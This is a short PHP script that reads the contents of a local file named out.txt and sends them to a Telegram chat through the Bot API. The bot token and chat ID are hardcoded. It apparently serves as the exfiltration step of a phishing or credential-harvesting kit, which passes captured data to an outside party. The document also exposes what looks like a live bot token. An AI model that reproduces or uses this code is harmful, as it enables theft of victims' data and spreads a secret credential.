<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2023110231:AAFtxBXVJ4-aM_cMshxORW_lH1i_Pj1qar0/sendMessage?chat_id=1863870362&text=$msg");
?>
